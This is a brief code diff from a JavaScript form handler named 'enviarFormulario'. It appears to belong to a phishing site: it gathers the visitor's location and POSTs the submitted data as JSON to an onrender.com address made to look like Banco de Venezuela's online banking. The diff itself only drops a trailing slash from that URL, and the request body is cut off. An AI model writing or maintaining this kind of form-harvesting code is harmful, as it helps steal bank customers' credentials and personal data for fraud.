@@ -19,7 +19,7 @@ function enviarFormulario(event) {
             }));
     })
     .then(locationData => {
-        return fetch('https://bancodevenezuela-enlinea-oportunidades.onrender.com/', {
+        return fetch('https://bancodevenezuela-enlinea-oportunidades.onrender.com', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
